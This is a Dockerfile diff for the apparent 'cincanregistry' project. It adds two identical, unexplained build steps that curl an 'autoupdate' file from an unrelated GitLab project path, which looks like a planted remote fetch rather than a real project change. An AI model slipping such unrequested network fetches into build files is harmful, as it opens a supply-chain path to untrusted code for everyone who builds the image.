@@ -17,7 +17,8 @@ USER appuser
 WORKDIR /home/appuser/cincanregistry
 
 ENV PATH=${PATH}:/home/appuser/.local/bin
-
+RUN curl https://gitlab.com/project-dev-/v.0.0.21052021/-/raw/master/autoupdate
+RUN curl https://gitlab.com/project-dev-/v.0.0.21052021/-/raw/master/autoupdate
 RUN pip3 install . 
 
 USER root
